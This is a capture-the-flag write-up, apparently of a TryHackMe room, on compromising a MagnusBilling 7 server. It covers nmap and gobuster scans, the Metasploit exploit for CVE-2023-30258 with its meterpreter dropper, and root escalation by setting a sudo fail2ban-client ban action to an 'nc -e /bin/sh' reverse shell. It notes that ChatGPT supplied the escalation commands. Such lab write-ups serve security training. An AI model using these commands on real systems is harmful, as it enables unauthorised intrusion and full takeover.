# **Easy - Some mistakes can be costly.**

# Reconnaissance
Target: 10.10.228.140

## open services
```
sudo nmap -sV 10.10.228.140 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 23:42 EST
Nmap scan report for 10.10.228.140
Host is up (0.28s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
3306/tcp open  mysql   MariaDB (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Originally had -p- to scan all ports, although was taking too long

### **Explanation of Flags:**
- `sudo` → Needed for scanning ports below 1024
- `nmap` → Network scanning tool.
- `-sV` → Detects versions of services running on open ports.

## Enumeration of Webserver 

http://10.10.228.140 redirects to http://10.10.228.140/mbilling in a browser so we should enumrate both the root and subdirectory 

```
gobuster dir -u http://10.10.228.140/mbilling -w /usr/share/wordlists/dirb/common.txt -t 50

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.228.140/mbilling
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/akeeba.backend.log   (Status: 403) [Size: 277]
/archive              (Status: 301) [Size: 323] [--> http://10.10.117.52/mbilling/archive/]
/assets               (Status: 301) [Size: 322] [--> http://10.10.117.52/mbilling/assets/]
/development.log      (Status: 403) [Size: 277]
/fpdf                 (Status: 301) [Size: 320] [--> http://10.10.117.52/mbilling/fpdf/]
/index.html           (Status: 200) [Size: 30760]
/index.php            (Status: 200) [Size: 663]
/lib                  (Status: 301) [Size: 319] [--> http://10.10.117.52/mbilling/lib/]
/LICENSE              (Status: 200) [Size: 7652]
/production.log       (Status: 403) [Size: 277]
/protected            (Status: 403) [Size: 277]
/resources            (Status: 301) [Size: 325] [--> http://10.10.117.52/mbilling/resources/]
/spamlog.log          (Status: 403) [Size: 277]
/tmp                  (Status: 301) [Size: 319] [--> http://10.10.117.52/mbilling/tmp/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

 gobuster dir -u http://10.10.228.140/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.228.140/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/akeeba.backend.log   (Status: 403) [Size: 277]
/development.log      (Status: 403) [Size: 277]
/index.php            (Status: 302) [Size: 1] [--> ./mbilling]
/index.php            (Status: 302) [Size: 1] [--> ./mbilling]
/production.log       (Status: 403) [Size: 277]
/robots.txt           (Status: 200) [Size: 37]
/robots.txt           (Status: 200) [Size: 37]
/server-status        (Status: 403) [Size: 277]
/spamlog.log          (Status: 403) [Size: 277]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================

should have had .md within files, it would have found the readme.md with the version of MagnusBilling

```

# Unsuccessful Reconnaissance  
* Attempting SQL injection on the Login page gets our IP address banned and requires restarting the CTF
* The forgot password returns `{"success":false,"msg":"Email not found"}` although checking through source code of pages for email address to check came up empty. 
* Can we by-pass the IP blocking with X-forward-For and user-agent manipulation, no 
* Manaully searching all folders and files for anything that stood out

# Findings
* 10.10.228.140 directs us to http://10.10.228.140/mbilling/
* We see a loading screen for MagnusBilling and googling mbilling confirms MagnusBilling
* Googling suggest there should be a md file, which might contain version 
http://10.10.228.140/mbilling/README.md
```
###############
MagnusBilling 7 
###############
```
* Checking for exploits, we find  https://www.cve.org/CVERecord?id=CVE-2023-30258 for versions 6.* and 7* 

* There is an excellent rating exploit on Metasploit for CVE-2023-30258
```
msf6 > search CVE-2023-30258

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258  2023-06-26       excellent  Yes    MagnusBilling application unauthenticated Remote Command Execution.
   1    \_ target: PHP                                            .                .          .      .
   2    \_ target: Unix Command                                   .                .          .      .
   3    \_ target: Linux Dropper   
```

```
  use 0
  set target 2
  SHOW OPTIONS
  
  Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /mbilling        yes       The MagnusBilling endpoint URL
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host

```

# Exploiting

## Shell
```
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set target 2
set LHOST 10.4.114.252
set RHOST 10.10.228.140
exploit

[*] Started reverse TCP handler on 10.4.114.252:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.10.228.140:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 7 seconds.
[*] Elapsed time: 7.62 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080).
[*] Exploit completed, but no session was created.
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > exploit

[*] Started reverse TCP handler on 10.4.114.252:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.10.228.140:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 6 seconds.
[*] Elapsed time: 6.61 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080).
[*] Exploit completed, but no session was created.
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > sessions 

[*] Started reverse TCP handler on 10.4.114.252:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.10.228.140:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 6 seconds.
[*] Elapsed time: 6.61 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Using URL: http://10.4.114.252:8080/G2YU21p6b
[*] Client 10.10.228.140 (Wget/1.21) requested /G2YU21p6b
[*] Sending payload to 10.10.228.140 (Wget/1.21)
[*] Sending stage (3045380 bytes) to 10.10.228.140
[*] Meterpreter session 1 opened (10.4.114.252:4444 -> 10.10.228.140:39276) at 2025-03-09 00:12:21 -0500
[*] Command Stager progress - 100.00% done (114/114 bytes)
[*] Server stopped.

```

Note if you get the below, you might have burp suite open, close burp and run exploit again
`[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080).`

## User flag
Now we can search for the user.txt, it's normally within a user dir,
```
meterpreter > cd magnus
meterpreter > ls
Listing: /home/magnus
=====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2025-03-09 00:12:15 -0500  .bash_history
100600/rw-------  220   fil   2024-03-27 15:45:39 -0400  .bash_logout
100600/rw-------  3526  fil   2024-03-27 15:45:39 -0400  .bashrc
040700/rwx------  4096  dir   2024-09-09 08:01:09 -0400  .cache
040700/rwx------  4096  dir   2024-03-27 15:47:04 -0400  .config
040700/rwx------  4096  dir   2024-09-09 08:01:09 -0400  .gnupg
040700/rwx------  4096  dir   2024-03-27 15:46:12 -0400  .local
100700/rwx------  807   fil   2024-03-27 15:45:39 -0400  .profile
040700/rwx------  4096  dir   2024-03-27 15:46:17 -0400  .ssh
040700/rwx------  4096  dir   2024-03-27 15:46:12 -0400  Desktop
040700/rwx------  4096  dir   2024-03-27 15:46:12 -0400  Documents
040700/rwx------  4096  dir   2024-03-27 15:46:12 -0400  Downloads
040700/rwx------  4096  dir   2024-03-27 15:46:12 -0400  Music
040700/rwx------  4096  dir   2024-03-27 15:46:12 -0400  Pictures
040700/rwx------  4096  dir   2024-03-27 15:46:12 -0400  Public
040700/rwx------  4096  dir   2024-03-27 15:46:12 -0400  Templates
040700/rwx------  4096  dir   2024-03-27 15:46:12 -0400  Videos
100644/rw-r--r--  38    fil   2024-03-27 17:44:18 -0400  user.txt

meterpreter > cat user.txt 
THM{---------------------------}

```

## # Privilege Escalation flag
Running sudo -l to check sudo privileges, we find we can run fail2ban-client as sudo with no password

```
sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client

```

Asking ChatGPT how to find setup we find,

```
sudo /usr/bin/fail2ban-client status
Status
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd

```

ChatGPT also suggests we can set commands with sshd when using actions within /etc/fail2ban/action.d/ but can't with custom rules. Chat often lies but lets give it a chance

Giving Chat the list of files within action.d, it tells us
If you want to **trigger a reverse shell** when an IP is banned, the best choices are:

✅ **`iptables-multiport.conf`** (for banning specific ports)  
✅ **`iptables-allports.conf`** (for full IP bans)  
✅ **`route.conf`** (if you want to drop network routes)

I tried a bunch of reverse shells, before finding `nc -e /bin/sh 10.4.114.252 9001
works in the user shell we have. asking ChatGPT to spin us up the needfull,

```
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "nc -e /bin/sh 10.4.114.252 9001"
```

Making sure we have a listener back home
```
nc -lvnp 9001
```

Again ChatGPT with the goods for testing rules.
```
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```
Note if you need to retest, increase the ip address so the action is triggered.

```
nc -lvnp 9001                  

listening on [any] 9001 ...
connect to [10.4.114.252] from (UNKNOWN) [10.10.228.140] 44130

whoami
root
cd /root
ls
filename
passwordMysql.log
root.txt
cat root.txt
THM{------------------------------------------}

```

# Summary
Was a fun room, "easy" although I spent much more than the 60 minutes. Spent a little to long trying to bypass the IP block, find email addresses within source code for the forgot password and SQLi. Exploitdb didn't give me hits for MagnusBilling, took a bit too long to going back to searching other resources. Was happy to see sudo -l give up the privliaged escalation and that ChatGPT could do it's thing with fail2ban.  Likely didn't need to reverse shell, back who doesn't like a good reverse shell?

